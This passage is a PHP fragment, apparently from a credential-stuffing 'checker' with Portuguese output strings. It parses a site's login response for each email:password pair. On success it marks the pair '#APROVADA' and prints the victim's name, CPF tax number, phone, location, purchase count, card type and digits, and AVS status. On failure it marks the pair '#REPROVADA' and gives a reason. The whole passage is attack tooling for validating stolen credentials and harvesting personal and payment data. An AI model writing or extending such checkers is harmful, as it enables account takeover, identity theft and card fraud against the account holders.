...
if (stripos($logar, '"user"')) {
  ...
  echo json_encode(array(
    "status" => 0,
    "str" => "<b style='color:green;'>#APROVADA</b> -> <b style='color:white;'>$email:$senha</b> [Nome: $nome - Cpf: $cpf - Telefone: $telefone ] [Cidade: $cidade ($estado-$pais)] [Compras: $comprass $str][Cartão: $tipocartao ($digto) - Avs status check: $avs_check] ~ <b style='color:pink;'>#RaphaelTD2</b><br/>"
  ));
}
elseif (stripos($logar, '"msg": "O email ou senha est\u00e3o incorret')) {
  echo json_encode(array(
    "status" => 1,
    "str" => "<b style='color:red;'>#REPROVADA</b> -> <b style='color:white;'>$email:$senha</b> <b style='color:blue;'>(<b>O email ou senha estão incorretos)</b> ~ <b style='color:pink;'>#RaphaelTD2</b><br />"
  ));
}
elseif (stripos($logar, 'Por favor, conecte-se usando o Facebook')) {
  echo json_encode(array(
    "status" => 1,
    "str" => "<b style='color:red;'>#REPROVADA</b> -> <b style='color:white;'>$email:$senha</b> <b style='color:blue;'>(<b>Por favor, conecte-se usando o Facebook para fazer o login nessa conta)</b> ~ <b style='color:pink;'>#RaphaelTD2</b><br />"
  ));
}
else {
  echo json_encode(array(
    "status" => 1,
    "str" => "<b style='color:red;'>#REPROVADA</b> -> <b style='color:white;'>$email:$senha</b> <b style='color:blue;'>(<b>ERROR)</b> ~ <b style='color:pink;'>#RaphaelTD2</b><br />"
  ));
}
